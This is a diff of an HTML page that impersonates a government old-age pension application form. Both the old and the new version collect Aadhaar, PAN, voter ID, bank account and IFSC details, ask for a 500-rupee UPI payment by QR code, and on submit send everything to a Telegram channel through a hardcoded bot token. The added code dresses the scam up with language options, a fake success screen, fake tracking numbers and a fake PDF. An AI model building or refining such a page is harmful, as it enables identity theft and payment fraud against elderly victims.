@@ -1,251 +1,448 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Old Age Pension Form</title>
 <style>
-  /* [Existing CSS unchanged] */
+  :root{
+    --bg: #f8f9fa;
+    --card: #ffffff;
+    --primary: #007b5e;
+    --primary-dark: #005f47;
+    --border: #cbd5e1;
+    --focus: rgba(0, 123, 94, 0.25);
+  }
   body {
     font-family: Arial, sans-serif;
-    background-color: #f8f9fa;
+    background: linear-gradient(135deg, #f7f9fc 0%, #eef2f7 100%);
     padding: 20px;
+    margin: 0;
   }
   header {
     text-align: center;
-    background-color: #004aad;
+    background: linear-gradient(90deg, #004aad, #0058d4);
     color: white;
-    padding: 15px;
-    border-radius: 5px;
+    padding: 16px;
+    border-radius: 12px;
+    box-shadow: 0 6px 12px rgba(0,0,0,.08);
   }
-  form, .tracking {
-    background: white;
-    padding: 20px;
-    border-radius: 8px;
-    max-width: 600px;
+  .container {
+    max-width: 720px;
     margin: 20px auto;
-    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    background: var(--card);
+    padding: 20px 24px;
+    border-radius: 14px;
+    box-shadow: 0 12px 24px rgba(0,0,0,.08);
   }
-  input, button, select {
+  .lang-bar {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 6px;
+  }
+  .row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    margin-bottom: 12px;
+  }
+  input, select, button {
     width: 100%;
-    padding: 10px;
-    margin-top: 8px;
-    margin-bottom: 15px;
-    border: 1px solid #ccc;
-    border-radius: 5px;
+    padding: 12px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-size: 14px;
+    background: #fff;
+  }
+  input:focus, select:focus {
+    outline: none;
+    box-shadow: 0 0 0 3px var(--focus);
+    border-color: #0b6b4a;
   }
   button {
-    background-color: #007b5e;
-    color: white;
+    background-color: var(--primary);
+    color: #fff;
     border: none;
     font-size: 16px;
     cursor: pointer;
+    border-radius: 8px;
+    padding: 12px 20px;
+    margin-top: 6px;
   }
   button:hover {
-    background-color: #005f47;
+    background-color: var(--primary-dark);
   }
   .qr {
     text-align: center;
-    margin-top: 15px;
+    margin-top: 10px;
   }
   .note {
     text-align: center;
-    color: blue;
-    margin-top: 10px;
+    color: #1e40af;
+    margin-top: 6px;
   }
-  .app-number {
-    font-weight: bold;
-    color: darkred;
+  #successView {
+    display: none;
+    text-align: center;
+    margin-top: 24px;
+  }
+  #successView.active {
+    display: block;
+  }
+  #successView h2 {
+    color: #064e3b;
+    margin-bottom: 18px;
+  }
+  #successDetails p {
+    margin: 5px 0;
+    text-align: left;
+    max-width: 600px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .download-btn {
+    margin-top: 12px;
+    display: inline-block;
+    background-color: #0a5a2b;
+    color: #fff;
+    padding: 10px 18px;
+    text-decoration: none;
+    border-radius: 6px;
+    cursor: pointer;
   }
 </style>
-<script>
-  // Language text object for Bengali (bn)
-  const texts = {
-    bn: {
-      title: "বার্ধক্য ভাতা আবেদন ফর্ম",
-      gov: "পশ্চিমবঙ্গ সরকার",
-      name: "নাম",
-      aadhar: "আধার নম্বর",
-      phone: "ফোন নম্বর",
-      post: "পোস্ট অফিস নির্বাচন করুন",
-      pan: "প্যান নম্বর (ঐচ্ছিক)",
-      voter: "ভোটার কার্ড নম্বর",
-      account: "ব্যাংক অ্যাকাউন্ট নম্বর",
-      ifsc: "IFSC কোড",
-      note: "এই পেমেন্ট করা টাকা টাও আপনি আপনার ব্যাংকে পেয়ে যাবেন।",
-      pay: "৫০০ টাকা পরিশোধের জন্য নিচের QR কোড স্ক্যান করুন",
-      utr: "UTR নম্বর লিখুন",
-      submit: "জমা দিন",
-      track: "আবেদন ট্র্যাক করুন",
-      placeholder: "আপনার ১৫ ডিজিট আবেদন নম্বর দিন"
-    }
-  };
-
-  // Post offices in South 24 Parganas
-  const postOffices = [
-    "Alipore", "Ballygunge", "Baruipur", "Behala", "Budge Budge", "Diamond Harbour",
-    "Ghutiari Sharif", "Jaynagar Majilpur", "Kakdwip", "Raidighi", "Canning",
-    "Namkhana", "Mandirbazar", "Patharpratima", "Bhangar", "Sonarpur", "Falatah",
-    "Basanti", "Joynagar", "Sagar", "Mathurapur"
-  ];
-
-  // Function to populate texts based on language (default bn)
-  function changeLanguage(lang) {
-    const t = texts[lang];
-    document.getElementById("title").textContent = t.title;
-    document.getElementById("gov").textContent = t.gov;
-    document.getElementById("labelName").textContent = t.name + ":";
-    document.getElementById("labelAadhar").textContent = t.aadhar + ":";
-    document.getElementById("labelPhone").textContent = t.phone + ":";
-    document.getElementById("labelPost").textContent = t.post + ":";
-    document.getElementById("labelPan").textContent = t.pan + ":";
-    document.getElementById("labelVoter").textContent = t.voter + ":";
-    document.getElementById("labelAccount").textContent = t.account + ":";
-    document.getElementById("labelIfsc").textContent = t.ifsc + ":";
-    document.getElementById("note").textContent = t.note;
-    document.getElementById("payText").textContent = t.pay;
-    document.getElementById("labelUtr").textContent = t.utr + ":";
-    document.getElementById("submitBtn").textContent = t.submit;
-    document.getElementById("trackTitle").textContent = t.track;
-    document.getElementById("trackNum").placeholder = t.placeholder;
-  }
-
-  // Generate 15-digit application number
-  function generateAppNumber() {
-    return Math.floor(100000000000000 + Math.random() * 900000000000000);
-  }
-
-  // On form submission: send data to Telegram channel and show application number
-  function handleSubmit(event) {
-    event.preventDefault();
-    const appNumber = generateAppNumber();
-    const data = {
-      name: document.querySelector('input[name="name"]').value,
-      aadhar: document.querySelector('input[name="aadhar"]').value,
-      phone: document.querySelector('input[name="phone"]').value,
-      post: document.querySelector('select[name="post"]').value,
-      pan: document.querySelector('input[name="pan"]').value,
-      voter: document.querySelector('input[name="voter"]').value,
-      account: document.querySelector('input[name="account"]').value,
-      ifsc: document.querySelector('input[name="ifsc"]').value,
-      utr: document.querySelector('input[name="utr"]').value,
-      applicationNumber: appNumber
-    };
-
-    // Create message text to send to Telegram channel
-    const message = `
-নাম: ${data.name}
-আধার: ${data.aadhar}
-ফোন: ${data.phone}
-পোস্ট অফিস: ${data.post}
-প্যান: ${data.pan}
-ভোটার কার্ড নম্বর: ${data.voter}
-ব্যাংক অ্যাকাউন্ট নম্বর: ${data.account}
-IFSC: ${data.ifsc}
-UTR: ${data.utr}
-আবেদন নম্বর: ${appNumber}
-    `;
-
-    fetch("https://api.telegram.org/bot5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: "-1003102946985",
-        text: message
-      })
-    })
-    .then(response => response.json())
-    .then(() => {
-      // Show success message with application number
-      document.getElementById("applicationResult").innerHTML =
-        "Your registration is successful. Copy your Application Tracking Number: <br>" +
-        "<span class='app-number'>" + appNumber + "</span>";
-      // Optionally reset form fields here if desired
-    })
-    .catch(() => {
-      document.getElementById("applicationResult").innerHTML =
-        "Submission failed. Please try again.";
-    });
-  }
-
-  // Track application by 15-digit application number
-  function handleTrack() {
-    const trackNum = document.getElementById("trackNum").value.trim();
-    if (trackNum.length === 15 && !isNaN(trackNum)) {
-      alert("Your application " + trackNum + " is now under review.");
-    } else {
-      alert("Please enter a valid 15-digit Application Number.");
-    }
-  }
-
-  // Populate post offices into the dropdown on page load
-  window.onload = function() {
-    changeLanguage('bn');
-    const postSelect = document.querySelector('select[name="post"]');
-    postOffices.forEach(p => {
-      const opt = document.createElement('option');
-      opt.value = p;
-      opt.textContent = p;
-      postSelect.appendChild(opt);
-    });
-  };
-</script>
 </head>
 <body>
 
 <header>
-  <h1 id="gov">পশ্চিমবঙ্গ সরকার</h1>
+  <h1 id="gov">Government of India</h1>
 </header>
 
-<h2 id="title" style="text-align:center;">বার্ধক্য ভাতা আবেদন ফর্ম</h2>
+<div class="container">
 
-<form onsubmit="handleSubmit(event)" novalidate>
-  <label id="labelName" for="name">নাম:</label>
-  <input type="text" id="name" name="name" required />
-
-  <label id="labelAadhar" for="aadhar">আধার নম্বর:</label>
-  <input type="text" id="aadhar" name="aadhar" required />
-
-  <label id="labelPhone" for="phone">ফোন নম্বর:</label>
-  <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" title="Enter a valid 10-digit phone number" required />
-
-  <label id="labelPost" for="post">পোস্ট অফিস:</label>
-  <select id="post" name="post" required>
-    <option value="" disabled selected>--পোস্ট অফিস নির্বাচন করুন--</option>
-  </select>
-
-  <label id="labelPan" for="pan">প্যান নম্বর (ঐচ্ছিক):</label>
-  <input type="text" id="pan" name="pan" />
-
-  <label id="labelVoter" for="voter">ভোটার কার্ড নম্বর:</label>
-  <input type="text" id="voter" name="voter" required />
-
-  <label id="labelAccount" for="account">ব্যাংক অ্যাকাউন্ট নম্বর:</label>
-  <input type="text" id="account" name="account" required />
-
-  <label id="labelIfsc" for="ifsc">IFSC কোড:</label>
-  <input type="text" id="ifsc" name="ifsc" required />
-
-  <div class="note" id="note"></div>
-
-  <div class="qr">
-    <p id="payText"></p>
-    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=tadegayatri13@oksbi&pn=Gayatri%20Tade&am=500" alt="Payment QR" />
+  <div class="lang-bar">
+    <label for="languageSelect" style="align-self:center; font-weight:600; margin-right:6px;">Language</label>
+    <select id="languageSelect" aria-label="Select Language" style="width:auto;">
+      <option value="en">English</option>
+      <option value="bn">বাংলা</option>
+      <option value="hi">हिन्दी</option>
+    </select>
   </div>
 
-  <label id="labelUtr" for="utr">UTR নম্বর:</label>
-  <input type="text" id="utr" name="utr" required />
+  <h2 id="title" style="text-align:center;">Old Age Pension Form</h2>
 
-  <button type="submit" id="submitBtn">জমা দিন</button>
-</form>
+  <form id="form" novalidate>
+    <div class="row">
+      <div>
+        <label id="labelName" for="name">Name</label>
+        <input type="text" id="name" name="name" required />
+      </div>
+      <div>
+        <label id="labelAadhar" for="aadhar">Aadhaar Number</label>
+        <input type="text" id="aadhar" name="aadhar" required />
+      </div>
+    </div>
 
-<div id="applicationResult" class="note"></div>
+    <div class="row">
+      <div>
+        <label id="labelPhone" for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required />
+      </div>
+      <div>
+        <label id="labelPost" for="post">Post Office</label>
+        <select id="post" name="post" required>
+          <option value="" disabled selected>Select Post Office</option>
+        </select>
+      </div>
+    </div>
 
-<div class="tracking">
-  <h3 id="trackTitle">আবেদন ট্র্যাক করুন</h3>
-  <input type="text" id="trackNum" placeholder="আপনার ১৫ ডিজিট আবেদন নম্বর দিন" />
-  <button onclick="handleTrack()">Track</button>
+    <div class="row">
+      <div>
+        <label id="labelPan" for="pan">PAN Number (Optional)</label>
+        <input type="text" id="pan" name="pan" />
+      </div>
+      <div>
+        <label id="labelVoter" for="voter">Voter Card Number</label>
+        <input type="text" id="voter" name="voter" required />
+      </div>
+    </div>
+
+    <div class="row">
+      <div>
+        <label id="labelAccount" for="account">Bank Account Number</label>
+        <input type="text" id="account" name="account" required />
+      </div>
+      <div>
+        <label id="labelIfsc" for="ifsc">IFSC Code</label>
+        <input type="text" id="ifsc" name="ifsc" required />
+      </div>
+    </div>
+
+    <div class="note" id="note"></div>
+
+    <div class="qr">
+      <p id="payText"></p>
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=test@upi&pn=Demo&am=500" alt="Payment QR" />
+    </div>
+
+    <div class="row">
+      <div>
+        <label id="labelUtr" for="utr">UTR Number</label>
+        <input type="text" id="utr" name="utr" required />
+      </div>
+    </div>
+
+    <button type="submit" id="submitBtn">Submit</button>
+  </form>
+
+  <h3 id="trackTitle" style="text-align:center;margin-top:24px;">Track Application</h3>
+  <input type="text" id="trackNum" placeholder="Enter 15 or 20 digit application number" />
+  <button onclick="handleTrack()" style="margin-top:8px;">Track</button>
+  <div id="trackError" style="text-align:center;margin-top:10px;color:red;display:none;"></div>
+
+  <div id="successView">
+    <h2>Your Registration Successfully</h2>
+    <div id="successDetails"></div>
+    <a id="downloadPDF" href="#" class="download-btn" download="RegistrationDetails.pdf" style="display:none;">Download PDF</a>
+  </div>
+
 </div>
+
+<script>
+  const texts = {
+    en: {
+      title: "Old Age Pension Form",
+      labelName: "Name",
+      labelAadhar: "Aadhaar Number",
+      labelPhone: "Phone Number",
+      labelPost: "Post Office",
+      labelPan: "PAN Number (Optional)",
+      labelVoter: "Voter Card Number",
+      labelAccount: "Bank Account Number",
+      labelIfsc: "IFSC Code",
+      note: "This payment will reach your bank account.",
+      pay: "Scan the QR below to pay 500",
+      labelUtr: "UTR Number",
+      submit: "Submit",
+      track: "Track Application",
+      placeholder: "Enter your 15-digit or 20-digit application number",
+      error: "Please enter a valid 15 or 20 digit application number."
+    },
+    bn: {
+      title: "বার্ধক্য ভাতা আবেদন ফর্ম",
+      labelName: "নাম",
+      labelAadhar: "আধার নম্বর",
+      labelPhone: "ফোন নম্বর",
+      labelPost: "পোস্ট অফিস নির্বাচন করুন",
+      labelPan: "প্যান নম্বর (ঐচ্ছিক)",
+      labelVoter: "ভোটার কার্ড নম্বর",
+      labelAccount: "ব্যাংক অ্যাকাউন্ট নম্বর",
+      labelIfsc: "IFSC কোড",
+      note: "এই পেমেন্ট আপনার ব্যাংকে পৌঁছে যাবে।",
+      pay: "৫০০ টাকা পরিশোধের জন্য নিচের QR কোড স্ক্যান করুন",
+      labelUtr: "UTR নম্বর লিখুন",
+      submit: "জমা দিন",
+      track: "আবেদন ট্র্যাক করুন",
+      placeholder: "আপনার ১৫ বা ২০ ডিজিট আবেদন নম্বর দিন",
+      error: "সঠিক ১৫ বা ২০ ডিজিট আবেদন নম্বর দিন।"
+    },
+    hi: {
+      title: "बुजुर्ग पेंशन फ़ॉर्म",
+      labelName: "नाम",
+      labelAadhar: "आधार संख्या",
+      labelPhone: "फोन नंबर",
+      labelPost: "पोस्ट ऑफिस चुनें",
+      labelPan: "पैन नंबर (ऑप्शनल)",
+      labelVoter: "वोटर कार्ड नंबर",
+      labelAccount: "बैंक खाता नंबर",
+      labelIfsc: "IFSC कोड",
+      note: "यह भुगतान आपके बैंक खाते में पहुंचेगा।",
+      pay: "500 रुपए के लिए नीचे के QR को स्कैन करें",
+      labelUtr: "UTR संख्या",
+      submit: "जमा करें",
+      track: "आवेदन ट्रैक करें",
+      placeholder: "अपनी 15 या 20 अंकों का आवेदन नंबर दर्ज करें",
+      error: "कृपया मान्य १५ या २० अंकों का आवेदन नंबर दें।"
+    }
+  };
+
+  const languageSelect = document.getElementById("languageSelect");
+  const postSelect = document.getElementById("post");
+  const titleEl = document.getElementById("title");
+  const submitBtn = document.getElementById("submitBtn");
+  const trackTitle = document.getElementById("trackTitle");
+  const trackNumInput = document.getElementById("trackNum");
+  const trackError = document.getElementById("trackError");
+  let currentLang = "en";
+
+  function changeLanguage(lang) {
+    currentLang = lang;
+    const t = texts[lang] || texts.en;
+    document.documentElement.lang = lang;
+    titleEl.textContent = t.title;
+    document.getElementById("labelName").textContent = t.labelName + ":";
+    document.getElementById("labelAadhar").textContent = t.labelAadhar + ":";
+    document.getElementById("labelPhone").textContent = t.labelPhone + ":";
+    document.getElementById("labelPost").textContent = t.labelPost + ":";
+    document.getElementById("labelPan").textContent = t.labelPan + ":";
+    document.getElementById("labelVoter").textContent = t.labelVoter + ":";
+    document.getElementById("labelAccount").textContent = t.labelAccount + ":";
+    document.getElementById("labelIfsc").textContent = t.labelIfsc + ":";
+    document.getElementById("note").textContent = t.note;
+    document.getElementById("payText").textContent = t.pay;
+    document.getElementById("labelUtr").textContent = t.labelUtr + ":";
+    submitBtn.textContent = t.submit;
+    trackTitle.textContent = t.track;
+    trackNumInput.placeholder = t.placeholder;
+    trackError.style.display = "none";
+  }
+
+  languageSelect.addEventListener("change", (e) => {
+    changeLanguage(e.target.value);
+  });
+
+  // Populate Post Offices
+  const postOffices = ["Alipore","Ballygunge","Baruipur","Behala","Budge Budge","Diamond Harbour",
+    "Ghutiari Sharif","Jaynagar Majilpur","Kakdwip","Raidighi","Canning",
+    "Namkhana","Mandirbazar","Patharpratima","Bhangar","Sonarpur","Falatah",
+    "Basanti","Joynagar","Sagar","Mathurapur"
+  ];
+
+  postOffices.forEach(p => {
+    const opt = document.createElement("option");
+    opt.value = p;
+    opt.textContent = p;
+    postSelect.appendChild(opt);
+  });
+
+  // Tracking Number Generator
+  function generateTrackingNumber() {
+    return (Math.floor(Math.random() * 9e19) + 1e19).toString();
+  }
+
+  // Telegram integration to send form data to channel
+  function sendToTelegram(data) {
+    const botToken = '5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE';
+    const channelId = '-1003102946985';
+    let message = `<b>Old Age Pension Application Submitted</b>\n\n`;
+    message += `<b>Name:</b> ${data.name}\n`;
+    message += `<b>Aadhaar Number:</b> ${data.aadhar}\n`;
+    message += `<b>Phone Number:</b> ${data.phone}\n`;
+    message += `<b>Post Office:</b> ${data.post}\n`;
+    message += `<b>PAN Number:</b> ${data.pan || 'N/A'}\n`;
+    message += `<b>Voter Card Number:</b> ${data.voter}\n`;
+    message += `<b>Bank Account Number:</b> ${data.account}\n`;
+    message += `<b>IFSC Code:</b> ${data.ifsc}\n`;
+    message += `<b>UTR Number:</b> ${data.utr}\n`;
+    message += `<b>Tracking Number:</b> ${data.trackingNumber}\n`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: channelId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    }).then(response => {
+      if (!response.ok) {
+        console.error('Telegram message sending failed.');
+      }
+    }).catch(err => console.error('Error sending message to Telegram', err));
+  }
+
+  // Handle form submission
+  document.getElementById("form").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const data = {
+      name: this.name.value.trim(),
+      aadhar: this.aadhar.value.trim(),
+      phone: this.phone.value.trim(),
+      post: this.post.value,
+      pan: this.pan.value.trim(),
+      voter: this.voter.value.trim(),
+      account: this.account.value.trim(),
+      ifsc: this.ifsc.value.trim(),
+      utr: this.utr.value.trim(),
+      trackingNumber: generateTrackingNumber()
+    };
+
+    // Basic validation (optional)
+    if (!data.name || !data.aadhar || !data.phone || !data.post || !data.voter || !data.account || !data.ifsc || !data.utr) {
+      alert("Please fill all required fields");
+      return;
+    }
+
+    // Show success view
+    showSuccess(data);
+
+    // Send data to telegram channel
+    sendToTelegram(data);
+  });
+
+  // Show success view and populate details
+  function showSuccess(data) {
+    document.getElementById("form").style.display = "none";
+    document.getElementById("successView").classList.add("active");
+
+    const container = document.getElementById("successDetails");
+    container.innerHTML = "";
+    for (let key in data) {
+      let label = key.replace(/([A-Z])/g, ' $1').toUpperCase();
+      if(key === "trackingNumber") label = "TRACKING NUMBER";
+      const p = document.createElement("p");
+      p.innerHTML = "<strong>" + label + ":</strong> " + (data[key] || "—");
+      container.appendChild(p);
+    }
+
+    // Prepare PDF download link
+    preparePdfDownload(data);
+  }
+
+  // Create and download basic PDF using Blob (for demonstration)
+  function preparePdfDownload(data) {
+    let content = "Your Registration Successfully\n\n";
+    for (let key in data) {
+      let label = key.replace(/([A-Z])/g, ' $1').toUpperCase();
+      if(key === "trackingNumber") label = "TRACKING NUMBER";
+      content += label + ": " + (data[key] || "—") + "\n";
+    }
+    const blob = new Blob([content], { type: 'application/pdf' });
+    const url = URL.createObjectURL(blob);
+    const downloadBtn = document.getElementById("downloadPDF");
+    downloadBtn.href = url;
+    downloadBtn.style.display = "inline-block";
+  }
+
+  // Track application
+  function handleTrack() {
+    const val = trackNumInput.value.trim();
+    const t = texts[currentLang] || texts.en;
+    if(val.length === 15 || val.length === 20) {
+      trackError.style.color = "green";
+      trackError.textContent = t.track + " - " + val + " is under review.";
+      trackError.style.display = "block";
+    } else {
+      trackError.style.color = "red";
+      trackError.textContent = t.error;
+      trackError.style.display = "block";
+    }
+  }
+
+  document.querySelector("button[onclick='handleTrack()']").addEventListener("click", handleTrack);
+
+  // Init default language on load
+  window.onload = () => {
+    changeLanguage("en");
+  };
+</script>
 
 </body>
 </html>
